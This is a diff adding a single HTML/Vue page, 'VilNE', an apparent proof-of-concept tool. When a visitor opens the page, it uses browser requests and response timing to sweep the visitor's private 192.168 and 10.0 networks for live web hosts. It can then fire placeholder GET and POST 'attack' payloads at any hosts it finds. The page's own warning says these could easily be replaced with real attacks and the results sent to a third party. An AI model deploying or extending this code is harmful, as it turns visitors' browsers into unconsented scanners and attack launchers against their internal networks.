@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+
+  <title>VilNE - Victim Initiated Local Network Enumerator/Exploiter</title>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.4/axios.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
+
+  <!-- Required Stylesheets -->
+  <link type="text/css" rel="stylesheet" href="https://unpkg.com/bootstrap/dist/css/bootstrap.min.css" />
+  <link type="text/css" rel="stylesheet" href="https://unpkg.com/bootstrap-vue@latest/dist/bootstrap-vue.css" />
+
+  <!-- Load polyfills to support older browsers -->
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es2015%2CIntersectionObserver"></script>
+
+  <!-- Required scripts -->
+  <script src="https://unpkg.com/vue@latest/dist/vue.js"></script>
+  <script src="https://unpkg.com/bootstrap-vue@latest/dist/bootstrap-vue.js"></script>
+</head>
+
+<body>
+  <!-- Our application root element -->
+  <div id="app">
+    <b-container>
+      <h2>VilNE - Victim Initiated Local Network Enumerator/Exploiter (AKA WANKBAGS)</h2>
+      <h5 style="color:red; font-size: smaller">VILNE will scan your internal networks and if Attack Hosts is
+        selected, will attempt to blindly throw fake attacks at those hosts.
+        While these are fake attacks, it would be trivial to change these to a library of real attacks, and the
+        information gathered could easily be sent to an 3rd party.
+        Use of this tool or any variations thereof is at your own risk, and the creator is not responsible for
+        any damaged caused by this or any future variations.</h5>
+      <b-row style="padding-top:1rem;">
+        <b-col>
+          <h5>Class C Discovery Timeout</h5>
+          <b-form-input v-model="discoveryTimeout" />
+        </b-col>
+      </b-row>
+      <b-row style="padding-top:1rem;">
+        <b-col>
+          <h5>Host Scan Timeout</h5>
+          <b-form-input v-model="timeout">
+        </b-col>
+      </b-row>
+      <b-row style="padding-top:1rem;">
+        <b-col>
+          <h5>Host Scan Group Size</h5>
+          <b-form-input v-model="ipGroupSize"></b-form-input>
+        </b-col>
+      </b-row>
+      <b-row style="padding-top:1rem;">
+        <b-col>
+          <h5>Class B Networks To Scan</h5>
+          <b-input-group class="mt-3">
+            <b-form-input v-model="newNetwork" :state="newNetwork ? validNetwork : null"></b-form-input>
+            <b-input-group-append>
+              <b-button variant="success" @click="addNetwork">Add</b-button>
+            </b-input-group-append>
+          </b-input-group>
+          <div v-for="(network,i) in networks">{{network}} <a href="#" @click="deleteNetwork(i)">X</a></div>
+        </b-col>
+        <b-col>
+          <h5>Ports To Scan</h5>
+          <b-input-group class="mt-3">
+            <b-form-input v-model="newPort" :state="newPort ? validPort : null"></b-form-input>
+            <b-input-group-append>
+              <b-button variant="success" @click="addPort" type="number">Add</b-button>
+            </b-input-group-append>
+          </b-input-group>
+          <div v-for="(port,i) in ports">{{port}} <a href="#" @click="deletePort(i)">X</a></div>
+        </b-col>
+        <b-col>
+          <h5>Attack Hosts</h5>
+          <b-input-group button class="mt-3">
+            <b-form-checkbox v-model="attackHosts" button-variant="warning" button>
+              {{ attackHosts ? 'Yes' : 'No' }}
+            </b-form-checkbox>
+          </b-input-group>
+        </b-col>
+      </b-row>
+      <b-row style="padding-top:1rem;">
+        <b-col>
+          <b-button variant="success" @click="scanNow">Scan Now</b-button>
+          <b-button variant="outline-primary" @click="reset">Reset</b-button>
+        </b-col>
+      </b-row>
+      <b-row style="padding-top:1rem;">
+        <b-col>
+          <b-progress :value="statuscurrent" :max="statusmax" show-progress animated></b-progress>
+          <br />
+          <b-card title="Status">
+            <b-card-text v-if="status==0">Waiting</b-card-text>
+            <b-card-text v-if="status==1">Discovering Potential Network: {{addressBeingScanned}}</b-card-text>
+            <b-card-text v-if="status==2">Scanning For Devices</b-card-text>
+            <b-card-text v-if="status==3">Scan Complete</b-card-text>
+          </b-card>
+        </b-col>
+      </b-row>
+      <b-row v-for="(network, id) of classCs" :key="id" style="padding-top:1rem;">
+        <b-col>
+          <b-card title="Discovered Network:">
+            <b-card-text>{{network}}.0
+              {{networksScanned[network] && networksScanned[network].done ? "Complete" : ""}}
+            </b-card-text>
+
+            <template v-if="networksScanned[network] && networksScanned[network].items.length">
+              <h4>Discovered Hosts:</h4>
+              <b-card-text v-for="result in networksScanned[network].items" :key="result">
+                {{result}}
+              </b-card-text>
+            </template>
+          </b-card>
+        </b-col>
+      </b-row>
+    </b-container>
+  </div>
+
+  <style>
+    body {
+      padding: 20px;
+    }
+
+    b-col {
+      font-weight: 200;
+    }
+  </style>
+
+  <script>
+    var app = new Vue({
+      el: '#app',
+      data: {
+        discoveryTimeout: 200,
+        timeout: 1000,
+        ipGroupSize: 50,
+        addressBeingScanned: "",
+        classCs: [],
+        networksScanned: {},
+        ports: ["80", "443", "8000", "8080", "8001"],
+        newPort: "",
+        networks: ["192.168", "10.0"],
+        newNetwork: "",
+        status: 0,
+        statusmax: 0,
+        statuscurrent: 0,
+        attackHosts: false,
+        payloads: [
+          ["GET", "evil=stuff&other=true"],
+          ["POST", "queryString=icouldbeveryevil"]
+        ],
+        stop: false
+      },
+      methods: {
+        addNetwork: function () {
+          if (this.validNetwork) {
+            this.networks.push(this.newNetwork);
+            this.newNetwork = "";
+          } else {
+            alert("Not a valid network!");
+          }
+        },
+        deleteNetwork: function (i) {
+          this.networks.splice(i, 1);
+        },
+        addPort: function () {
+          this.ports.push(this.newPort);
+          this.newPort = "";
+        },
+        deletePort: function (i) {
+          this.ports.splice(i, 1);
+        },
+        reset: function () {
+          this.stop = true;
+        },
+        scanNow: async function () {
+          this.status = 1;
+          for (let network of this.networks) {
+            if (!this.stop) {
+              let liveHosts = [];
+              //Find potential networks
+              for (let i = 0; i <= 255; i++) {
+                if (!this.stop) {
+                  this.statuscurrent++;
+                  this.statusmax = (this.networks.length * 255);
+                  let ip = `http://${network}.${i}.1`;
+                  this.addressBeingScanned = `${network}.${i}.0`;
+                  if (await this.scanHost(ip, this.discoveryTimeout)) {
+                    this.classCs.push(`${network}.${i}`);
+                    Vue.set(this.networksScanned, `${network}.${i}`, {
+                      done: false,
+                      items: []
+                    });
+                  }
+                }
+              }
+            }
+          }
+          this.status = 2;
+          //Scan each discovered network
+          for (let classC of this.classCs) {
+            if (!this.stop) {
+              //Create list of addresses to scan
+              let addressesToScan = []
+              for (let i = 1; i < 255; i++) {
+                if (!this.stop) {
+                  for (let port of this.ports) {
+                    addressesToScan.push(
+                      `${(port == 443 ? "https" : "http")}://${classC}.${i}:${port}`);
+                  }
+                }
+              }
+              //Cut list of addresses to scan down into groups
+              let groups = this.createGroups(addressesToScan);
+              //Scan each group of addresses
+              for (let group of groups) {
+                if (!this.stop) {
+                  //Create arrays of promised functions of each group IPs 
+                  let itemsToScan = [];
+                  for (let address of group) {
+                    if (!this.stop) {
+                      itemsToScan.push(this.scanHost(address, this.timeout));
+                    }
+                  }
+                  //Run each group and wait for it to finish
+                  let scanResults = await Promise.all(itemsToScan);
+                  //Parse the results from each group
+                  for (let result of scanResults) {
+                    if (!this.stop) {
+                      if (result) {
+                        this.networksScanned[classC].items.push(result);
+                        if (this.attackHosts) {
+                          for (let payload of this.payloads) {
+                            this.attackHost(payload[0], result, payload[1]);
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+              this.networksScanned[classC].done = true;
+
+              //Check if the scanning is complete
+              let complete = true;
+              for (let item of Object.values(this.networksScanned)) {
+                if (!item.done) {
+                  complete = false;
+                }
+              }
+              if (complete) {
+                this.status = 3;
+              }
+            }
+          }
+          if (this.stop) {
+            this.classCs = [];
+            this.networksScanned = {};
+            this.newNetwork = "";
+            this.statuscurrent = 0;
+            this.status = 0;
+            this.stop = false;
+          }
+        },
+        scanHost: async function (address, timeout) {
+          let startTime = moment().valueOf();
+          try {
+            let result = await axios({
+              method: "GET",
+              url: address,
+              timeout: timeout
+            })
+          } catch (err) {
+            let endTime = moment().valueOf();
+            let totalTime = endTime - startTime;
+            if (totalTime >= timeout) {
+              return (false);
+            } else {
+              return address;
+            }
+          }
+        },
+        attackHost: function (method, address, payload) {
+          axios({
+            method: method,
+            data: method == "GET" ? "" : payload,
+            url: method == "GET" ? address + "?" + payload : address,
+            timeout: this.timeout
+          })
+        },
+        createGroups: function (array) {
+          return array.reduce((resultArray, item, index) => {
+            const groupIndex = Math.floor(index / this.ipGroupSize)
+            if (!resultArray[groupIndex]) {
+              resultArray[groupIndex] = []
+            }
+            resultArray[groupIndex].push(item)
+            return resultArray
+          }, [])
+        }
+      },
+      computed: {
+        validNetwork: function () {
+          if (this.newNetwork.match(/\b(1?[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.(1?[0-9]{1,2}|2[0-4][0-9]|25[0-5])\b$/g)) {
+            return true;
+          }
+          return false;
+        },
+        validPort: function () {
+          if (this.newPort > 0 && this.newPort <= 63535) {
+            return true;
+          }
+          return false
+        }
+      }
+    })
+  </script>
+</body>
+
+</html>
